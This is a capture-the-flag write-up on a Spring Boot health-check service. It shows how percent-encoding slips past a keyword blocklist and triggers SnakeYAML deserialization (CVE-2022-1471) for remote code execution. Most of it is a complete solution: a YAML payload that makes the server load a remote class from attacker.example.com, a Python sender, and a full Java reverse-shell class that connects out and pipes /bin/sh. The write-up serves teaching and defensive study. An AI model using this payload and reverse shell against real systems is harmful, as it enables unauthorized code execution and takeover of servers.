# HealthCheck as a Service: SnakeYAML Deserialization Leading to Remote Code Execution

In this CTF challenge, we explore a vulnerability in a Spring Boot health check service that processes YAML configurations. The challenge demonstrates how insufficient input validation combined with an outdated SnakeYAML library can lead to remote code execution through YAML deserialization.

## Challenge Overview

The challenge presents us with a Spring Boot web service that performs database health checks where:
- Users can submit database configurations in YAML format
- The service attempts to validate and parse the YAML input
- The parsed configuration is used to test database connectivity
- A simple input validation mechanism blocks certain suspicious keywords

The system implements some standard security measures:
- Input validation through a keyword blocklist
- Structured data parsing with a popular YAML library

The challenge setup provides players with:
- A URL pointing to the running service
- A JAR file containing the application source code

## Initial Code Analysis

Let's examine the core mechanics and data structures in detail.

### Core Components

The application consists of several key components:

1. ApiController - Handles HTTP requests and processes YAML input:
```java
@RestController
public class ApiController {
   @PostMapping
   public String checkDatabaseHealth(@RequestBody String str) {
      Validator.validate(str);
      Map<String, Object> yamlConfig = (Map)this.yaml.load(str);
      DbConfig dbConfig = DbConfig.of(yamlConfig.get("hostname").toString(), 
                                    yamlConfig.get("port").toString(),
                                    yamlConfig.get("databaseType").toString(), 
                                    yamlConfig.get("databaseName").toString());
      // ... connection testing logic
   }
}
```

2. Validator - Implements basic security filtering:
```java
public class Validator {
   public static void validate(String payload) {
      String[] blockList = new String[]{"Script", "Engine", "ClassLoader"};
      for(String s : blockList) {
         if (payload.contains(s)) {
            throw new RuntimeException("Dont try to hack me");
         }
      }
   }
}
```

### Key Security Mechanisms

#### Input Validation
The Validator class implements a simple blocklist approach, checking for dangerous keywords:
- "Script"
- "Engine"
- "ClassLoader"

These keywords are commonly associated with Java deserialization attacks, particularly those targeting the ScriptEngine functionality.

#### YAML Processing
The application uses SnakeYAML for parsing user input, which is known to have vulnerabilities in versions prior to 2.0. The parsed data is then mapped to a structured DbConfig object for database testing.

## Finding the Vulnerability

An obvious attack vector emerged during analysis:

1. The version of SnakeYAML used is vulnerable to CVE-2022-1471
2. The keyword blocklist can potentially be bypassed

The keyword blocklist vulnerability became apparent after examining the SnakeYAML source code, specifically the tag URI scanning implementation in ScannerImpl.java:

```java
private String scanTagUri(String name, Mark startMark) {
  // See the specification for details.
  // Note: we do not check if URI is well-formed.
  StringBuilder chunks = new StringBuilder();
  // Scan through accepted URI characters, which includes the standard
  // URI characters, plus the start-escape character ('%').
  ...
}
```

The comments in the source code explicitly mention that URI validation is not performed and that the '%' character is accepted as a start-escape character. This suggests that percent-encoding (URL encoding) could be used to bypass the keyword blocklist while still being properly interpreted by the YAML parser.

The most interesting aspect is the combination of this parser behavior with the outdated SnakeYAML version's simple string-based blocklist that doesn't account for encoded characters. By URL-encoding certain characters in the blocked keywords, we can bypass the validation while still triggering the SnakeYAML vulnerability.

## The Exploit

Let's break down the attack step by step.

### Exploit Setup

The exploit requires:
1. A payload that bypasses the keyword filter using URL encoding
2. A malicious Java class that implements ScriptEngineFactory
3. A web server to host the malicious class
4. A netcat listener to receive the reverse shell

### Attack Flow

1. Create a malicious payload using URL-encoded keywords:
```python
doc = r"""
hostname: foo
port: 1337
databaseType: foo
databaseName: !!javax.script.S%63riptEngin%65Manager [!!java.net.URLCl%61ssLoader [[!!java.net.URL ["http://attacker.example.com/"]]]]
"""
```

2. Create a Java payload for the reverse shell:
```java
public class Exploit implements ScriptEngineFactory {
  public Exploit() throws Exception {
    Socket client = new Socket();
    client.connect(new InetSocketAddress("1.2.3.4", 8080));
    // ... shell setup code ...
  }
  // ... ScriptEngineFactory interface implementations ...
}
```

3. Send the exploit:
```python
r = requests.post("http://3.137.187.148:1337/", data=doc)
```

### Why It Works

The exploit succeeds because:
1. URL-encoded characters bypass the simple string-based blocklist
2. SnakeYAML processes the encoded characters during parsing
3. The ScriptEngineManager instantiation triggers class loading
4. Our malicious class gains execution through the ScriptEngineFactory interface

## Complete Solution

solve.py

```python
import requests

doc = r"""
hostname: foo
port: 1337
databaseType: foo
databaseName: !!javax.script.S%63riptEngin%65Manager [!!java.net.URLCl%61ssLoader [[!!java.net.URL ["http://attacker.example.com/"]]]]
"""

r = requests.post("http://3.137.187.148:1337/", data=doc)
print(r.text)
```

Exploit.java

```java
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.List;
import java.net.URL;
import java.net.URLConnection;


public class Exploit implements ScriptEngineFactory {
  public Exploit() throws Exception {
    Socket client = new Socket();
    client.connect(new InetSocketAddress("1.2.3.4", 8080));

    OutputStream socin  = client.getOutputStream();
    InputStream socout = client.getInputStream();

    Process process = new ProcessBuilder("/bin/sh").redirectInput(ProcessBuilder.Redirect.PIPE).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();

    OutputStream stdin   = process.getOutputStream();
    InputStream stdout  = process.getInputStream();
    InputStream stderr  = process.getErrorStream();

    byte[] buffer = new byte[1024];
    int bytes = 0;

    while (process.isAlive()) {
        do {
            bytes = socout.read(buffer, 0, buffer.length);
            if (bytes > 0) {
                stdin.write(buffer, 0, bytes);
                stdin.flush();
            }
        } while (socout.available() > 0);

        while (stderr.available() > 0) {
            bytes = stderr.read(buffer, 0, buffer.length);
            if (bytes > 0) {
                socin.write(buffer, 0, bytes);
                socin.flush();
            }
        }
        while (stdout.available() > 0) {
            bytes = stdout.read(buffer, 0, buffer.length);
            if (bytes > 0) {
                socin.write(buffer, 0, bytes);
                socin.flush();
            }
        }
    }

  }

  @Override public String getEngineName() { return null; }
  @Override public String getEngineVersion() { return null; }
  @Override public List<String> getExtensions() { return null; }
  @Override public List<String> getMimeTypes() { return null; }
  @Override public List<String> getNames() { return null; }
  @Override public String getLanguageName() { return null; }
  @Override public String getLanguageVersion() { return null; }
  @Override public Object getParameter(String key) { return null; }
  @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
  @Override public String getOutputStatement(String toDisplay) { return null; }
  @Override public String getProgram(String... statements) { return null; }
  @Override public ScriptEngine getScriptEngine() { return null; }
}
```


## Key Takeaways

1. Simple string-based validation can be bypassed with encoding tricks
2. Using outdated libraries with known vulnerabilities is dangerous
3. YAML deserialization requires careful consideration of security implications

This challenge demonstrates how combining multiple seemingly minor security oversights - an outdated library and simplistic input validation - can lead to complete system compromise through remote code execution.
